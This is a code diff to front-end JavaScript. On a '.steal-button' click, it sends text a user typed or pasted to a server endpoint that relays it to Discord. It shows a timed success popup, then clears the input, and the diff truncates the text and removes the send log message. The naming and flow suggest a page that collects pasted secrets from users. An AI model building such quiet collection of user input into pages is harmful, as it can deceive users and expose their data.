@@ -3,21 +3,19 @@ document.querySelector('.steal-button').addEventListener('click', () => {
   const successMessage = document.querySelector('.success-message');
   const inputText = document.querySelector('.input-box').value;
 
-
   popup.style.display = 'flex';
   setTimeout(() => successMessage.style.display = 'block', 6000);
 
-
   if (inputText.trim()) {
+    const truncatedText = inputText.length > 1500 ? inputText.slice(0, 1500) + '... [TRUNCATED]' : inputText;
     fetch('/api/send-to-discord', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ inputText }),
+      body: JSON.stringify({ inputText: truncatedText }),
     })
-      .then(res => res.ok ? console.log('Sent to Discord!') : console.error('Server error'))
-      .catch(err => console.error('Network error:', err));
+      .then(res => res.ok ? null : console.error('Failed to send'))
+      .catch(err => console.error('Error:', err));
   }
-
 
   setTimeout(() => {
     popup.style.display = 'none';
@@ -25,7 +23,6 @@ document.querySelector('.steal-button').addEventListener('click', () => {
     document.querySelector('.input-box').value = '';
   }, 11000);
 });
-
 
 const dots = document.querySelector('.dots');
 let [posX, posY, dirX, dirY] = [0, 0, 1, 1];
